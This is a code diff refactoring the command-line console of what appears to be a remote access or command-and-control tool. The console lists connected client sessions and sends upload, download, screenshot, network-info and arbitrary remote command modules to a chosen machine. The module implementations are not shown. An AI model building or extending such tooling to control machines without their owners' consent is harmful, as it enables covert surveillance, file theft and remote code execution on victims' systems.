@@ -31,20 +31,6 @@ class CommandLineInterface:
         self.commandHandler()
         init() # Colorama
 
-    def getActiveSessions(self):
-        """Gets the active sessions managed by the Server."""
-        pass
-
-    def selectActiveSession(self, session):
-        """Changes the current active session.
-
-        Args:
-            session (int): The session id to change to.
-        """
-
-        if type(session) == int:# and
-            self._currentSession = session
-
     def sessionHandler(self):
         """Handles the pseudo-terminal once a valid session is chosen"""
         user = os.getlogin().lower()
@@ -72,8 +58,9 @@ class CommandLineInterface:
                 args = user_input.split()[1:]
                 local_file = args[0]
                 remote_file = args[1]
+                connection = self.server.getConnection(self._currentSession - 1)
 
-                mod = UploadFile(self._currentSession, local_file, remote_file)
+                mod = UploadFile(connection, local_file, remote_file)
                 stdout = mod.execute()
 
                 print(stdout)
@@ -83,8 +70,9 @@ class CommandLineInterface:
 
                 remote_file = args[0]
                 local_file = args[1]
+                connection = self.server.getConnection(self._currentSession - 1)
 
-                mod = DownloadFile(self._currentSession, remote_file, local_file)
+                mod = DownloadFile(connection, remote_file, local_file)
                 stdout = mod.execute()
 
                 print(stdout)
@@ -93,16 +81,20 @@ class CommandLineInterface:
             if user_input.startswith('screenshot'):
                 args = user_input.split()[1:]
 
-                local_file = args[0]
+                local_path = args[0]
+                connection = self.server.getConnection(self._currentSession - 1)
 
-                mod = Screenshot(self._currentSession, local_file)
+                mod = Screenshot(connection, local_path)
                 stdout = mod.execute()
 
                 print(stdout)
 
             if user_input == 'netinfo':
+                connection = self.server.getConnection(self._currentSession - 1)
+                client_os = self.server.getClient(self._currentSession - 1).getClientInfo()[4]
 
-                mod = NetInfo(self._currentSession)
+
+                mod = NetInfo(connection, client_os)
                 stdout = mod.execute()
 
                 print(stdout)
@@ -110,17 +102,12 @@ class CommandLineInterface:
             if user_input.startswith('run'):
                 args = user_input.split()[1:]
 
+                connection = self.server.getConnection(self._currentSession - 1)
                 command = ' '.join(args)
 
-                stdout = Run(self._currentSession, command).execute()
+                stdout = Run(connection, command).execute()
 
                 print(stdout)
-
-            if user_input == 'test':
-                self.server.sendTo(self._currentSession - 1, b'test')
-                data = self.server.recvFrom(self._currentSession - 1)
-
-                print(data.decode())
 
             if user_input == 'back':
                 self._currentSession = None
@@ -156,7 +143,7 @@ class CommandLineInterface:
                 if clients:
                     while not valid_session:
                         for i,c in enumerate(clients):
-                            print(Fore.RED + "\t\t{}".format(i+1) + Style.RESET_ALL + " - {}:{} - OS: {}".format(c[1],c[2],c[3]))
+                            print(Fore.RED + "\t\t{}".format(i+1) + Style.RESET_ALL + " - {}:{} - OS: {}".format(c[2],c[3],c[4]))
 
                         print(Fore.RED + "\t\tback" + Style.RESET_ALL + " - Go back without choosing a session")
                         sess = input("session nº> ")
@@ -178,7 +165,7 @@ class CommandLineInterface:
                 if clients:
                     while not valid_session:
                         for i, c in enumerate(clients):
-                            print(Fore.RED + "\t\t{}".format(i+1) + Style.RESET_ALL + " - {}:{} - OS: {}".format(c[1],c[2],c[3]))
+                            print(Fore.RED + "\t\t{}".format(i+1) + Style.RESET_ALL + " - {}:{} - OS: {}".format(c[2],c[3],c[4]))
 
                         print(Fore.RED + "\t\tback" + Style.RESET_ALL + " - Go back without choosing a session")
                         sess = input("session nº> ")
